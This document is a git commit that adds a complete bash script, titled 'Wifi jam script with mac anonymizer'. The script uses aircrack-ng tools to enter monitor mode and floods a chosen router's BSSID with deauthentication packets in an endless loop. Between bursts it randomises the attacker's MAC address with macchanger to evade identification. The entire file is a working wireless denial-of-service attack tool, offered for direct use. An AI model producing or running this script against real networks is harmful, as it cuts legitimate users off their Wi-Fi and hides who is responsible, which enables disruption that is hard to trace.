40e85871dfff16544d78015c3fdc22b0270f650a
Michael Stephens <michael.stephens@procore.com>
2017-06-04 13:22:12 -0700

    Wifi jam script with mac anonymizer

---
+++ jam_wifi.sh
@@ -0,0 +1,96 @@
+#! /bin/bash
+
+# usage:
+# sudo ./jam_wifi.sh -b <bssid> -c <channel> -f <frequency> <interface>
+
+USER_INTERFACE=${@:$#}
+frequency=15
+nbpps=1024
+
+while getopts ':b::c::f::x:h' opt; do
+  case "$opt" in
+    b) bssid=$OPTARG ;;
+    c) channel=$OPTARG ;;
+    h) help=true ;;
+    f) frequency=$OPTARG ;;
+    x) nbpps=$OPTARG ;;
+    :) echo "Option -$OPTARG requires an argument" ;;
+  esac
+done
+
+if [ "$help" = true ] || [ -z "$1" ] || [ "$1" = "--help" ]; then
+  echo Usage:
+  echo "sudo ./jam_wifi.sh -b <bssid> -c <channel> <interface>"
+  echo
+  echo Options:
+  echo "-b        BSSID of the router (required)"
+  echo "-c        Channel of the router (required)"
+  echo "-f        Frequency of hits between MAC change (default: 20, 0 is infinite)"
+  echo "-h        Print help"
+  echo "-x        Number of packets per second (default: 1024, max: 1024)"
+  echo
+  echo Requirements:
+  echo "- aircrack-ng"
+  echo "- ifconfig (if on Kali 2.0, alias ifconfig to /sbin/ifconfig)"
+  echo "- macchanger"
+  exit 1
+fi
+
+if [ -z "$bssid" ]; then
+  echo "ERROR: BSSID required"
+  exit 1
+fi
+if [ -z "$channel" ]; then
+  echo "ERROR: Channel required"
+  exit 1
+fi
+
+echo --------------------------------------------------------------------------
+echo Anonymizing Mac
+echo --------------------------------------------------------------------------
+sudo ifconfig $USER_INTERFACE down
+sudo macchanger -r $USER_INTERFACE
+sudo ifconfig $USER_INTERFACE up
+
+echo
+echo --------------------------------------------------------------------------
+echo Configuring network
+echo --------------------------------------------------------------------------
+sudo airmon-ng check
+echo Killing processes
+sudo airmon-ng check kill > /dev/null
+read INTERFACE <<< $(sudo airmon-ng start wlan0 | grep 'phy0' | awk ' { print $2 }')
+echo Monitor Mode Active
+echo New Interface: $INTERFACE
+
+while true
+do
+  echo
+  echo --------------------------------------------------------------------------
+  echo Changing channel
+  echo --------------------------------------------------------------------------
+  sudo iwconfig $INTERFACE channel $channel
+  echo New channel: $channel
+  echo
+  echo --------------------------------------------------------------------------
+  echo Jamming $bssid
+  echo --------------------------------------------------------------------------
+  sudo aireplay-ng -0 $frequency -x $nbpps -a $bssid $INTERFACE
+  echo
+  echo --------------------------------------------------------------------------
+  echo Anonymizing Mac
+  echo --------------------------------------------------------------------------
+  sudo ifconfig $INTERFACE down
+  sudo macchanger -r $INTERFACE
+  sudo ifconfig $INTERFACE up
+  echo
+  echo --------------------------------------------------------------------------
+  echo Verify Mac
+  echo --------------------------------------------------------------------------
+  sudo macchanger $INTERFACE
+  echo
+  echo --------------------------------------------------------------------------
+  echo Waiting
+  echo --------------------------------------------------------------------------
+  sleep 3
+done
